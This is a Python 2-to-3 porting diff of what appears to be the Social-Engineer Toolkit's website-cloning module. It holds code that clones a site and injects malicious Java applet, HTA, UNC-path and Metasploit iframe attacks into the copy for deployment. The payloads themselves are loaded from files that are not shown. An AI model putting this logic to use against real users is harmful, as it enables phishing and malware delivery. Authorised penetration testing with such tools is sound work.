@@ -10,7 +10,7 @@ import sys
 import time
 import re
 import shutil
-import urllib
+import urllib.request, urllib.parse, urllib.error
 
 operating_system = check_os()
 definepath = os.getcwd()
@@ -32,7 +32,7 @@ track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()
 if check_options("IPADDR=") != 0:
     ipaddr = check_options("IPADDR=")
 else:
-    ipaddr = raw_input("Enter your IP address: ")
+    ipaddr = input("Enter your IP address: ")
     update_options("IPADDR=" + ipaddr)
 
 # Define base value
@@ -48,7 +48,7 @@ if not os.path.isdir(setdir + "/web_clone/"):
 # if we used a proxy configuration from the set-proxy
 if os.path.isfile(setdir + "/proxy.confg"):
 
-    fileopen = file(setdir + "/proxy.config", "r")
+    fileopen = open(setdir + "/proxy.config", "r")
     proxy_config = fileopen.read().rstrip()
 
 # just do a ls
@@ -60,7 +60,7 @@ if not os.path.isfile(setdir + "/proxy.confg"):
 webdav_meta = 0
 # see if exploit requires webdav
 try:
-    fileopen = file(setdir + "/meta_config", "r")
+    fileopen = open(setdir + "/meta_config", "r")
     for line in fileopen:
         line = line.rstrip()
         match = re.search("set SRVPORT 80", line)
@@ -73,7 +73,7 @@ except:
 
 template = ""
 # Grab custom or set defined
-fileopen = file(setdir + "/site.template", "r").readlines()
+fileopen = open(setdir + "/site.template", "r").readlines()
 for line in fileopen:
     line = line.rstrip()
     match = re.search("TEMPLATE=", line)
@@ -84,7 +84,7 @@ for line in fileopen:
 # grab attack_vector specification
 attack_vector = ""
 if os.path.isfile(setdir + "/attack_vector"):
-    fileopen = file(setdir + "/attack_vector", "r").readlines()
+    fileopen = open(setdir + "/attack_vector", "r").readlines()
     for line in fileopen:
         attack_vector = line.rstrip()
 
@@ -104,7 +104,7 @@ update_options("APPLET_NAME=" + rand_gen_applet)
 
 try:
     # open our config file that was specified in SET
-    fileopen = file(setdir + "/site.template", "r").readlines()
+    fileopen = open(setdir + "/site.template", "r").readlines()
     # start loop here
     url_counter = 0
     for line in fileopen:
@@ -120,8 +120,8 @@ try:
     # if we aren't using multi attack with templates do this
     if url != "NULL":
         if template != "SET":
-            print(bcolors.YELLOW + "\n[*] Cloning the website: " + (url))
-            print("[*] This could take a little bit..." + bcolors.ENDC)
+            print((bcolors.YELLOW + "\n[*] Cloning the website: " + (url)))
+            print(("[*] This could take a little bit..." + bcolors.ENDC))
 
     # clone the website
     if template != "SELF":
@@ -131,20 +131,19 @@ try:
         # try except block in case no internet connection, route to Internet,
         # etc.
         try:
-                # check if we have wget, if we don't then use urllib2
-            wget = 0
-            if os.path.isfile("/usr/local/bin/wget"):
-                wget = 1
-            if os.path.isfile("/usr/bin/wget"):
-                wget = 1
-            if os.path.isfile("/usr/local/wget"):
-                wget = 1
+
+            # check if we have wget, if we don't then use urllib2 - special thanks to chrismaddalena  for the pull request!
+            # wget is called, but output is sent to devnull to hide "wget:
+            # missing URL" error
+            DNULL = open(os.devnull, 'w')
+            wget = subprocess.call(
+                'wget', shell=True, stdout=DNULL, stderr=subprocess.STDOUT)
 
             if wget == 1:
                 subprocess.Popen('%s;cd %s/web_clone/;wget --no-check-certificate -O index.html -c -k -U "%s" "%s";' % (
                     proxy_config, setdir, user_agent, url), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
-            if wget == 0:
+            else:
                 # if we don't have wget installed we will use python to rip,
                 # not as good as wget
                 headers = {'User-Agent': user_agent}
@@ -157,7 +156,7 @@ try:
                     # if the site has cloned properly
                     site_cloned = True
                     # open file for writing
-                    filewrite = file(setdir + "/web_clone/index.html", "w")
+                    filewrite = open(setdir + "/web_clone/index.html", "w")
                     # write the data back from the request
                     filewrite.write(html)
                     # close the file
@@ -169,30 +168,30 @@ try:
 
         # If the website did not clone properly, exit out.
         if not os.path.isfile(setdir + "/web_clone/index.html"):
-            print(
-                bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC)
+            print((
+                bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC))
             return_continue()
             site_cloned = False
             # add file to let set interactive shell know it was unsuccessful
-            filewrite = file(setdir + "/cloner.failed", "w")
+            filewrite = open(setdir + "/cloner.failed", "w")
             filewrite.write("failed")
             filewrite.close()
 
         if os.path.isfile(setdir + "/web_clone/index.html"):
-            fileopen = file(setdir + "/web_clone/index.html", "r")
+            fileopen = open(setdir + "/web_clone/index.html", "r")
             counter = 0
             for line in fileopen:
                 counter = counter + 1
             if counter == 1 or counter == 0:
-                print(
-                    bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC)
+                print((
+                    bcolors.RED + "[*] Error. Unable to clone this specific site. Check your internet connection.\n" + bcolors.ENDC))
                 return_continue()
                 site_cloned = False
                 os.remove(setdir + "/web_clone/index.html")
 
                 # add file to let set interactive shell know it was
                 # unsuccessful
-                filewrite = file(setdir + "/cloner.failed", "w")
+                filewrite = open(setdir + "/cloner.failed", "w")
                 filewrite.write("failed")
                 filewrite.close()
 
@@ -206,12 +205,12 @@ try:
 
         # if we specify UNC embedding
         if unc_embed == True:
-            fileopen = file(setdir + "/web_clone/index.html", "r")
+            fileopen = open(setdir + "/web_clone/index.html", "r")
             index_database = fileopen.read()
-            filewrite = file(setdir + "/web_clone/index.html", "w")
+            filewrite = open(setdir + "/web_clone/index.html", "w")
 
             # Open the UNC EMBED
-            fileopen4 = file("src/webattack/web_clone/unc.database", "r")
+            fileopen4 = open("src/webattack/web_clone/unc.database", "r")
             unc_database = fileopen4.read()
             unc_database = unc_database.replace("IPREPLACEHERE", ipaddr)
             unc_database = unc_database.replace("RANDOMNAME", rand_gen_win)
@@ -237,8 +236,8 @@ try:
             # Here we parse through the new website and add our java applet code, its a hack for now
             # Wrote this on the plane to Russia, easiest way to do this without
             # internet access :P
-            print(
-                bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC)
+            print((
+                bcolors.RED + "[*] Injecting Java Applet attack into the newly cloned website." + bcolors.ENDC))
             # Read in newly created index.html
             time.sleep(2)
             if not os.path.isfile(setdir + "/web_clone/index.html"):
@@ -247,12 +246,12 @@ try:
                     "Unable to clone the website it appears. Email us to fix.")
                 sys.exit()
 
-            fileopen = file(setdir + "/web_clone/index.html", "r")
+            fileopen = open(setdir + "/web_clone/index.html", "r")
             # Read add-on for java applet
-            fileopen2 = file("src/webattack/web_clone/applet.database", "r")
+            fileopen2 = open("src/webattack/web_clone/applet.database", "r")
             # Write to new file with java applet added
-            filewrite = file(setdir + "/web_clone/index.html.new", "w")
-            fileopen3 = file("src/webattack/web_clone/repeater.database", "r")
+            filewrite = open(setdir + "/web_clone/index.html.new", "w")
+            fileopen3 = open("src/webattack/web_clone/repeater.database", "r")
 
             # this is our cloned website
             index_database = fileopen.read()
@@ -353,17 +352,17 @@ try:
             # close the file after done writing
             filewrite.close()
 
-            print(bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win +
-                  "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC)
+            print((bcolors.BLUE + "[*] Filename obfuscation complete. Payload name is: " + rand_gen_win +
+                  "\n[*] Malicious java applet website prepped for deployment\n" + bcolors.ENDC))
 
         # if we are using HTA attack
         if check_options("ATTACK_VECTOR") == "HTA":
                 # </body>
             if os.path.isfile(setdir + "/Launcher.hta"):
-                data1 = file(setdir + "/web_clone/index.html", "r").read()
-                data2 = file(setdir + "/hta_index", "r").read()
+                data1 = open(setdir + "/web_clone/index.html", "r").read()
+                data2 = open(setdir + "/hta_index", "r").read()
                 data3 = data1.replace("</body>", data2 + "</body>")
-                filewrite = file(setdir + "/web_clone/index.html", "w")
+                filewrite = open(setdir + "/web_clone/index.html", "w")
                 filewrite.write(data3)
                 filewrite.close()
                 print_status("Copying over files to Apache server...")
@@ -386,8 +385,8 @@ try:
             multi_meta = "on"
 
         if attack_vector == "browser" or multi_meta == "on":
-            print(
-                bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC)
+            print((
+                bcolors.RED + "[*] Injecting iframes into cloned website for MSF Attack...." + bcolors.ENDC))
             # Read in newly created index.html
             if attack_vector == "multiattack":
                 if os.path.isfile(setdir + "/web_clone/index.html"):
@@ -401,8 +400,8 @@ try:
                     shutil.copyfile(
                         setdir + "/web_clone/index.html.new", setdir + "/web_clone/index.html")
                 time.sleep(1)
-            fileopen = file(setdir + "/web_clone/index.html", "r").readlines()
-            filewrite = file(setdir + "/web_clone/index.html.new", "w")
+            fileopen = open(setdir + "/web_clone/index.html", "r").readlines()
+            filewrite = open(setdir + "/web_clone/index.html.new", "w")
             counter = 0
             for line in fileopen:
                 counter = 0
@@ -435,8 +434,8 @@ try:
                 filewrite.close()
             except:
                 pass
-            print(
-                bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC)
+            print((
+                bcolors.BLUE + "[*] Malicious iframe injection successful...crafting payload.\n" + bcolors.ENDC))
 
         if attack_vector == "java" or attack_vector == "browser" or attack_vector == "multiattack":
             if not os.path.isfile(setdir + "/web_clone/%s" % (rand_gen_applet)):
